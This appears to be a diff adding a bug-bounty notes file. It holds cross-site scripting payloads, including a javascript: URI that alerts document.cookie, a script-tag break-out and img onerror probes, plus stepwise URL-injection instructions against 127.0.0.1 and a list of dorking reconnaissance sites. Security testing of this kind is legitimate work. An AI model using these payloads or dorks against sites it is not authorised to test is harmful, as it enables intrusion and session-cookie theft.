@@ -1,0 +1,38 @@
+XSS:
+
+payload : abc');</script><script>alert(1)</script>
+Payload : javascript:alert(document.cookie)
+
+Try Payload:
+https://127.0.0.1/Zaber
+https://127.0.0.1/Zaber><
+https://127.0.0.1/Zaber><script>alert(1)</script>
+https://127.0.0.1/Zaber><img src=x onerror=alert(1)</script>
+
+Method 01:
+- if you find that the webpage totally blank like https://127.0.0.1
+- Try https://127.0.0.1/Zaber and https://127.0.0.1/Zaber>< see the response
+- then again try https://127.0.0.1/Zaber><script>alert(1)</script> see the response
+- Then again try https://127.0.0.1/Zaber><img src=x onerror=alert(1)</script>
+
+
+Dork Helper: 
+
+https://dorks.faisalahmed.me/
+https://www.lopseg.com.br/google-dork
+https://www.lopseg.com.br/osint
+https://saitejapinnoju.in/
+https://taksec.github.io/google-dorks-bug-bounty/
+https://nitinyadav00.github.io/Bug-Bounty-Search-Engine/
+https://dorks.faisalahmed.me/
+https://mr-koanti.github.io/github.html
+https://mr-koanti.github.io/shodan
+https://dorks.faisalahmed.me/
+https://web-check.xyz/
+https://freelancermijan.github.io/reconengine/
+http://dork.ctfbd.io/
+https://dorks.s1rn3tz.ovh/googledorks
+https://dorks.s1rn3tz.ovh/gitdorks
+https://dorks.s1rn3tz.ovh/shodandorks
+https://www.dorkgpt.com/
+
